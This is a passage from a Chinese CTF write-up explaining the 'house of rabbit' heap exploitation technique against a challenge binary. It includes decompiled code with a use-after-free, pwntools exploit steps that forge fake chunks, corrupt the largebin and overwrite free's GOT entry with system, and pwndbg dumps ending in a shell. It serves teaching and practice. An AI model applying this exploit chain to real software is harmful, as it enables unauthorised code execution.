punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">13337</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>flags <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            v3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFFFFFFFFFFFFF70LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            flags <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>v3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"idx>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span> <span class=\"token operator\">&amp;&amp;</span> ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    ptr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>很明显只能申请 0x10、0x80、0xA00000 和 0xFFFFFFFFFFFFFF70 大小的 chunk 块，最多申请 9 次</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">del</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Del>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存在 uaf 漏洞</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">edt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Edt>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">>=</span> <span class=\"token number\">0xA</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"addr>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content>>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">myread_</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>fake<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以往 fake 地址处写，因此可以在 fake 处伪造 fakechunk，并可以修改 fd</p>\n<p>并且程序存在 system</p>\n<ol>\n<li>利用  <code>malloc consolidation</code>  机制去在 buffer 中获得一个 unsortedbin chunk，计算好位置，使得申请巨大内存后，切割下来的 chunk 刚好位于指针数组边上</li>\n<li>通过修改 buffer，使其大小小于 <code>0xA00010</code>  且大于 <code>0x80000</code> ，使该 chunk 通过 sort 过程进入 largebin</li>\n<li>申请巨大内存得到分割后的 chunk 位于指针数组边上，修改指针为 got [‘free’]，向其中写入内存 plt [‘system’]，劫持 free 函数，然后释放一个写有 <code>/bin/sh</code>  的 chunk，拿到 shell</li>\n</ol>\n<p>过程和原因一步一步的讲吧：</p>\n<h5 id=\"1malloc-consolidation\"><a class=\"markdownIt-Anchor\" href=\"#1malloc-consolidation\">#</a> <strong>1.malloc consolidation</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0xA00010</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0x10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>触发 <code>malloc consolidation</code>  效果如下：</p>\n<p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000│  0x6012e0 (ptr) ◂— 0x7ffff6dff010<br>\n01:0008│  0x6012e8 (ptr+8) —▸ 0x602420 —▸ 0x601350 (fake+16) ◂— 0x0<br>\n02:0010│  0x6012f0 (ptr+16) —▸ 0x602420 —▸ 0x601350 (fake+16) ◂— 0x0<br>\n03:0018│  0x6012f8 (ptr+24) ◂— 0x0<br>\n… ↓     11 skipped<br>\n0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) ◂— 0x1<br>\n12:0090│  0x601370 ◂— 0x0<br>\n13:0098│  0x601378 ◂— 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Free chunk (fastbins) | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0x20 (with flag bits: 0x21)<br>\nfd: 0x601350</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x602430<br>\nSize: 0xa20bd0 (with flag bits: 0xa20bd1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\n0x20: 0x602410 —▸ 0x601350 (fake+16) ◂— 0x0</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; tel 0x6012E0 20<br>\n00:0000│  0x6012e0 (ptr) ◂— 0x7ffff6dff010<br>\n01:0008│  0x6012e8 (ptr+8) —▸ 0x602420 —▸ 0x601333 ◂— 0x0<br>\n… ↓     2 skipped<br>\n04:0020│  0x601300 (ptr+32) ◂— 0x0<br>\n… ↓     10 skipped<br>\n0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n12:0090│  0x601370 ◂— 0x0<br>\n13:0098│  0x601378 ◂— 0x0</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; heap<br>\nAllocated chunk | PREV_INUSE<br>\nAddr: 0x602000<br>\nSize: 0x410 (with flag bits: 0x411)</p>\n<p>Allocated chunk | PREV_INUSE<br>\nAddr: 0x602410<br>\nSize: 0xa00010 (with flag bits: 0xa00011)</p>\n<p>Top chunk | PREV_INUSE<br>\nAddr: 0x1002420<br>\nSize: 0x20be0 (with flag bits: 0x20be1)</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x601350</p>\n</blockquote>\n<p>原因：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-rabbit/image-20240726091641543.png\" alt=\"image-20240726091641543\"></p>\n<p>我们可以看见</p>\n<blockquote>\n<p>0x00:pack(0)+pack(0x00),<br>\n0x10:pack(0)+pack(0x11),<br>\n0x20:pack(0)+pack(1)</p>\n</blockquote>\n<p>fake_chunk 设置的是这样。这需要让我们了解一下 <code>malloc consolidation</code>  的过程</p>\n<blockquote>\n<ol>\n<li>从 fastbin 中依次取出 fastbin chunk</li>\n<li>对 chunk 进行简易版的 free 的 consolidation 过程</li>\n<li>向前合并</li>\n<li>向后合并</li>\n<li>插入 unsortedbin</li>\n</ol>\n<p>这里会进行向前向后合并的操作，修改 prev_inuse 标志为 1，可以使其不向上合并，但是依然会进行向下合并的检查：</p>\n<ol>\n<li>用 chunk size + chunk addr 计算出下一个 chunk 所在位置</li>\n<li>用下一个 chunk size + 其 chunk addr 计算出再下一个 chunk 所在位置，然后判断 prev_inuse 位是否是 1，不是 1 就断链合并</li>\n</ol>\n</blockquote>\n<p>所以当触发 <code>malloc consolidation</code>  时</p>\n<blockquote>\n<p>0e:0070│  0x601350 (fake+16) ◂— 0x0 ------------------------------------------------&gt;unsortedbin</p>\n<p>0f:0078│  0x601358 (fake+24) ◂— 0x11<br>\n10:0080│  0x601360 (fake+32) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0<br>\n11:0088│  0x601368 (fake+40) —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x1002420 ◂— 0x0</p>\n</blockquote>\n<h5 id=\"2准备-largebin\"><a class=\"markdownIt-Anchor\" href=\"#2准备-largebin\">#</a> <strong>2. 准备 largebin</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x601350 (fake+16) —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x601350<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x601370:\t0x0000000000000000\t0x0000000000000000<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-∞: 0x601350 (fake+16) —▸ 0x7ffff7bc5348 (main_arena+2088) ◂— 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x601350<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0x0000000000a00001<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350<br>\n0x601380:\t0x0000000000000000\t0x0000000000000000<br>\n0x601390:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013a0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013b0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013c0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013d0:\t0x0000000000000000\t0x0000000000000000<br>\n0x6013e0:\t0x0000000000000000\t0x0000000000000000</p>\n</blockquote>\n<p>其实就是 unsortbin 遍历 size，满足切割分配的切割分配，大小精确匹配就分配，大小不匹配的就根据大小装入 largebin 和 smallbin。</p>\n<h5 id=\"3申请超大内存控制指针数组\"><a class=\"markdownIt-Anchor\" href=\"#3申请超大内存控制指针数组\">#</a> <strong>3. 申请超大内存控制指针数组</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add 之前</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nempty<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\n0x80000-∞: 0x601350 (fake+16) —▸ 0x7ffff7bc5348 (main_arena+2088) ◂— 0x601350</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000000</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff6dff010\t0x0000000000602420<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000000000<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0xfffffffffffffff0\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xfffffffffffffff1<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5348\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>add 之后</p>\n<blockquote>\n<p>pwndbg&gt; bins<br>\nfastbins<br>\nempty<br>\nunsortedbin<br>\nall: 0x6012d0 —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x6012d0<br>\nsmallbins<br>\nempty<br>\nlargebins<br>\nempty</p>\n</blockquote>\n<blockquote>\n<p>pwndbg&gt; x/20gx 0x6012e0</p>\n<p>0x6012d0:\t0x0000000000000000\t0x0000000000000071</p>\n<p>0x6012e0 <ptr>:\t0x00007ffff7bc4b78\t0x00007ffff7bc4b78<br>\n0x6012f0 &lt;ptr+16&gt;:\t0x0000000000602420\t0x0000000000602420<br>\n0x601300 &lt;ptr+32&gt;:\t0x0000000001002430\t0x0000000000601360<br>\n0x601310 &lt;ptr+48&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601320 &lt;ptr+64&gt;:\t0x0000000000000000\t0x0000000000000000<br>\n0x601330:\t0x0000000000000000\t0x0000000000000000<br>\n0x601340 <fake>:\t0x0000000000000070\t0x0000000000000000<br>\n0x601350 &lt;fake+16&gt;:\t0x0000000000000000\t0xffffffffffffff81<br>\n0x601360 &lt;fake+32&gt;:\t0x00007ffff7bc5335\t0x00007ffff7bc5348<br>\n0x601370:\t0x0000000000601350\t0x0000000000601350</p>\n</blockquote>\n<p>可见这里无疑发生了发生了很大的变化</p>\n<p>largebin 被置入 unsortedbin 内</p>\n<p>接下来我们了解原因</p>\n<blockquote>\n<ol>\n<li>unsortedbin 处理完之后，从 largebin 中找满足大小要求的 chunk 分配，要么直接分配出去，要么切割分配出去，剩下的部分装入 unsortedbin</li>\n<li>largebin 中最大的 chunk 范围是 <code>0x80000 - ∞</code></li>\n<li><strong>从 largebin 中分配不检查申请大小是否超出系统内存</strong></li>\n</ol>\n</blockquote>\n<p>所以当我们申请超大内存时，由于我们将 largebin 的 size 置成 <code>0xfffffffffffffff1</code> ，所以等我们去申请 <code>0xFFFFFFFFFFFFFF70LL</code>  就会将剩余的 0x80 的 chunk 块放进 unsortedbin 内。</p>\n<h5 id=\"4劫持free\"><a class=\"markdownIt-Anchor\" href=\"#4劫持free\">#</a> <strong>4. 劫持 free</strong></h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这就是申请一个 0x80 的 chunk 块，并将 ptr [0] 指向 free，接下来用 edit 写入程序自带的 system 即可，最后 free 掉内容为 <code>/bin/sh</code>  的 chunk 